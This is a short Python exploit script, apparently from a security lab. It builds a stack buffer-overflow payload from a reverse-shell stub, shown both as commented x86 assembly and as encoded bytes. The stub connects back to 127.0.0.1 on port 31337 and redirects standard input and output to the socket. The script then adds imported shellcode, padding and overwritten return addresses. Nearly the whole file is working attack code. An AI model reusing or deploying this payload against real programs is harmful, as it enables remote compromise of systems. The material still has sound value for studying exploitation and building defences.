from struct import pack
from shellcode import shellcode

'''
.global main
.section .text

main:

push	%ebp
mov	%esp, %ebp
sub     $0x14, %esp          # 20 bytes for sockfd and addr

xor     %eax, %eax
movb    $2, %al
movw    %ax, (%esp)          # addr.sin_family = AF_INET;

mov     $0xffffffff, %eax
sub     $0xfeffff80, %eax
mov     %eax, 4(%esp)        # addr.sin_addr.s_addr = 0x0100007f; // 127.0.0.1

movw    $0x697a, 2(%esp)     # addr.sin_port = 0x697a; // 31337

xor     %eax, %eax           # zero out addr.sin_zero
mov	%eax, 8(%esp)
mov	%eax, 12(%esp)

pushl   %eax                 # prepare calling socket()
pushl   $1
pushl   $2

xor     %eax, %eax           # zero out registers
xor     %ebx, %ebx
xor     %ecx, %ecx
mov     $102, %al            # socketcall
mov     $1, %bl              # socket
mov     %esp, %ecx
int     $0x80                # socket(AF_INET, SOCK_STREAM, 0);

mov     %eax, -4(%ebp)       # sockfd = ...

add     $12, %esp

pushl   $16                  # prepare calling connect()
lea     -20(%ebp), %eax
pushl   %eax
pushl   -4(%ebp)

xor     %eax, %eax           # zero out registers
xor     %ebx, %ebx
xor     %ecx, %ecx
mov     $102, %al            # socketcall
mov     $3, %bl              # connect
mov     %esp, %ecx
int     $0x80                # connect(sockfd,(struct sockaddr*) &addr, sizeof(addr));

add     $12, %esp

xor     %eax, %eax           # zero out registers
xor     %ebx, %ebx
xor     %ecx, %ecx
mov     $0x3f, %al
mov     -4(%ebp), %ebx
xor     %ecx, %ecx
int     $0x80                # dup2(sockfd, 0); // hook up stdin

xor     %eax, %eax           # zero out registers
xor     %ebx, %ebx
xor     %ecx, %ecx
mov     $0x3f, %al
mov     -4(%ebp), %ebx
mov     $1, %cl
int     $0x80                # dup2(sockfd, 1); // hook up stdout

xor     %eax, %eax           # zero out registers
xor     %ebx, %ebx
xor     %ecx, %ecx
mov     $0x3f, %al
mov     -4(%ebp), %ebx
mov     $2, %cl
int     $0x80                # dup2(sockfd, 2); // hook up stderr

'''

callback_shell = '\x55\x89\xe5\x83\xec\x14\x31\xc0\xb0\x02\x66\x89\x04\x24\xb8\xff\xff\xff\xff\x2d\x80\xff\xff\xfe\x89\x44\x24\x04\x66\xc7\x44\x24\x02\x7a\x69\x31\xc0\x89\x44\x24\x08\x89\x44\x24\x0c\x50\x6a\x01\x6a\x02\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\x45\xfc\x83\xc4\x0c\x6a\x10\x8d\x45\xec\x50\xff\x75\xfc\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x8b\x5d\xfc\x31\xc9\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x8b\x5d\xfc\xb1\x01\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x8b\x5d\xfc\xb1\x02\xcd\x80'

print(callback_shell + shellcode + (2048 - len(callback_shell) - len(shellcode)) * "\xff" + pack("<I", 0xbffe86f8) + pack("<I", 0xbffe8f0c))

